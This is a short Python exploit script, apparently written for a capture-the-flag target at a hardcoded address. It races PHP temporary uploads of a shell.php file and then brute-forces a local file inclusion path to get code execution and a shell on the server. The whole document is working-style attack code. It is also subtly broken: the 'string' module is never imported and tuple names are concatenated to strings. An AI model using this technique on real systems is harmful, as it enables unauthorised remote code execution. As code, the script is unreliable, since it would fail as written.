import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('./shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://103.97.125.56:31581/phpinfo?file=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://103.97.125.56:31581/phpinfo?file=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] We have got a shell: ' + url)
        sys.exit(0)

print('[x] Something went wrong, please try again')
